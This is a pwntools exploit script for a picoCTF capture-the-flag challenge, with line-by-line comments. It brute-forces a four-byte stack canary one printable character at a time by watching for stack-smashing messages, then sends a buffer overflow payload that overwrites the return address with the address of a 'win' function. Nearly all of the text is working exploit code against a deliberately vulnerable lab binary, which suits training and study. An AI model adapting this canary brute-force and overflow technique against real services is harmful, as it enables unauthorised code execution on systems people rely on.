#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 1234 ./vuln
from platform import win32_edition
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 1234)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

win=p32(0x08049336)
#set our buffer
buffer = 64
#set a blank canary value
canary = ''
#we know the canary is four bytes so setup our while loop
while len(canary) < 4:
    #for each item in the rang of ASCII printable characters
    for i in range(32,127):
        #start the program
        p = start()
        #set length to our buffer, plus how long the canary is, plus 1
        length = 64+len(canary)+1
        #send our length number to the first input
        p.sendlineafter("> ", str(length))
        #setup our payload
        payload = "A"*buffer+canary+chr(i)
        #print payload if you'd like to watch it
        #print(payload)
        #send payload tot he input
        p.sendlineafter('> ', payload)
        #print the character we're at if your curious
        #print(chr(i))
        #receive the line returned to see if we broke the canary
        l = p.recvline()
        
        #check if we broke the canary; if we didn't then we guessed the right char and add it to the canary
        if '*** Stack Smashing Detected' not in str(l):
            canary += chr(i)
            log.info('Partial canary: {}'.format(canary))
            break
        #close out the run
        p.close()
#once done print out the canary
log.success('Found canary: {}'.format(canary))

#start the program again
io = start()
#set a length equal to our total payload length
length = buffer+len(canary)+16+4
#setup our payload - convert the string 'canary' to bytes
payload = b'A'*buffer+bytes(canary, 'utf-8')+b'B'*16+win
#send the length first, converting it from int to str
io.sendlineafter('> ', str(length))
#send payload
io.sendlineafter('> ', payload)

io.interactive()